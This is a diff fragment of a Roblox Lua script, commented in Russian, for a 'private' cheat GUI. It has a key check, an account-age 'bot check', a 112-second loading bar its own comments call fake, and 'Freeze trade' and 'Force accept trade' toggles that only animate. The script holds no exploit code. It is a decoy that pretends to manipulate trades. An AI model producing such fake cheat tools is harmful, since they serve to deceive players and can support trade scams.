+    track.Size = UDim2.new(0, 44, 0, 22)
+    track.Position = UDim2.new(1, -54, 0.5, -11)
+    track.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
+    track.BorderSizePixel = 0
+    track.ZIndex = 12
+    track.Parent = toggleCard
+
+    createCorner(track, 11)
+
+    local thumb = Instance.new("Frame")
+    thumb.Size = UDim2.new(0, 16, 0, 16)
+    thumb.Position = UDim2.new(0, 3, 0.5, -8)
+    thumb.BackgroundColor3 = THEME.TextPrimary
+    thumb.BorderSizePixel = 0
+    thumb.ZIndex = 13
+    thumb.Parent = track
+
+    createCorner(thumb, 8)
+
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = ""
+    btn.ZIndex = 14
+    btn.Parent = track
+
+    local enabled = false
+    btn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        local targetPos = enabled and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+        local targetColor = enabled and THEME.AccentPurple or Color3.fromRGB(30, 30, 36)
         
-        TweenService:Create(mainMenu, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-            Size = isCollapsed and UDim2.new(0, 320, 0, 46) or menuSize,
-            BackgroundTransparency = 0
-        }):Play()
-    else
-        local tween = TweenService:Create(mainMenu, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
-            Size = UDim2.new(0, 320, 0, 0),
-            BackgroundTransparency = 1
-        })
-        tween:Play()
-        tween.Completed:Wait()
-        mainMenu.Visible = false
-    end
+        TweenService:Create(thumb, TweenInfo.new(0.2), {Position = targetPos}):Play()
+        TweenService:Create(track, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()
+    end)
 end
 
--- Горячая клавиша: RightAlt
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.RightAlt then
-        toggleMenu()
+createToggle(cheatMenuFrame, 0, "Freeze trade")
+createToggle(cheatMenuFrame, 58, "Force accept trade")
+
+-- ===========================================
+-- 4. ПОСЛЕДОВАТЕЛЬНОСТЬ СЦЕНАРИЯ
+-- ===========================================
+
+task.spawn(function()
+    -- 1. Приветствие
+    local tweenInTitle = TweenService:Create(titleText, TweenInfo.new(1.2), {TextTransparency = 0})
+    local tweenInPrivate = TweenService:Create(privateText, TweenInfo.new(1.2), {TextTransparency = 0})
+    tweenInTitle:Play()
+    tweenInPrivate:Play()
+    task.wait(2.8)
+
+    local tweenOutSplash = TweenService:Create(splashFrame, TweenInfo.new(1), {BackgroundTransparency = 1})
+    TweenService:Create(titleText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+    TweenService:Create(privateText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+    tweenOutSplash:Play()
+    
+    tweenOutSplash.Completed:Wait()
+    splashFrame.Visible = false
+    mainBackground.Visible = true
+
+    -- 2. Открытие окна ввода ключа (сразу после приветствия)
+    mainWindow.Visible = true
+    mainWindow.Size = UDim2.new(0, 380, 0, 0)
+    TweenService:Create(mainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 380, 0, 260)
+    }):Play()
+end)
+
+-- Проверка ключа -> Проверка на бота -> Загрузка -> Главное меню
+submitButton.MouseButton1Click:Connect(function()
+    if keyTextBox.Text == SECRET_KEY then
+        keyStatusLabel.TextColor3 = THEME.AccentGreen
+        keyStatusLabel.Text = "✅ Ключ верный!"
+        inputStroke.Color = THEME.AccentGreen
+        
+        task.wait(1)
+        keySystemFrame.Visible = false
+        botCheckFrame.Visible = true
+
+        -- Проверка на бота
+        task.wait(2)
+        if player.AccountAge < 30 then
+            botCheckLabel.Text = "❌ Ваш аккаунт моложе месяца, видимо вы бот"
+            botCheckLabel.TextColor3 = THEME.Danger
+        else
+            botCheckFrame.Visible = false
+            loadingFrame.Visible = true
+
+            -- Процесс фейковой загрузки (112 секунд)
+            local startTime = tick()
+            while tick() - startTime < LOADING_TIME do
+                local elapsed = tick() - startTime
+                local progress = math.min(elapsed / LOADING_TIME, 1)
+                
+                progressFill.Size = UDim2.new(progress, 0, 1, 0)
+                percentLabel.Text = string.format("%.1f%%", progress * 100)
+                task.wait(0.1)
+            end
+
+            progressFill.Size = UDim2.new(1, 0, 1, 0)
+            percentLabel.Text = "100%"
+            task.wait(0.5)
+
+            -- Появление надписи с благодарностью
+            loadingFrame.Visible = false
+            thankYouFrame.Visible = true
+            task.wait(3)
+
+            -- Выход в главное меню
+            thankYouFrame.Visible = false
+            cheatMenuFrame.Visible = true
+            headerTitle.Text = "Mertily's Private — Main Menu"
+        end
+    else
+        keyStatusLabel.TextColor3 = THEME.Danger
+        keyStatusLabel.Text = "❌ Неверный ключ!"
+        inputStroke.Color = THEME.Danger
+        
+        task.delay(2, function()
+            if keyStatusLabel.Text == "❌ Неверный ключ!" then
+                keyStatusLabel.Text = ""
+                inputStroke.Color = THEME.Border
+            end
+        end)
     end
 end)
 
--- === Логика анти-бот проверки при запуске ===
-task.spawn(function()
-    task.wait(0.3)
-    toggleMenu()
-    
-    -- Ожидание 4 секунды с надписью "Проверка на бота..."
-    task.wait(4)
-    
-    if player.AccountAge < 30 then
-        checkStatusText.Text = "❌ Ваш аккаунт моложе 30 дней, вы видимо бот"
-        checkStatusText.TextColor3 = THEME.Danger
-    else
-        botCheckFrame.Visible = false
-        contentContainer.Visible = true
-        print("[CoolMenu] Проверка успешно пройдена! Меню готово к работе.")
-    end
+-- Эффект при наведении
+submitButton.MouseEnter:Connect(function()
+    TweenService:Create(submitButton, TweenInfo.new(0.2), {BackgroundColor3 = THEME.CardHover}):Play()
+end)
+submitButton.MouseLeave:Connect(function()
+    TweenService:Create(submitButton, TweenInfo.new(0.2), {BackgroundColor3 = THEME.Card}):Play()
 end)
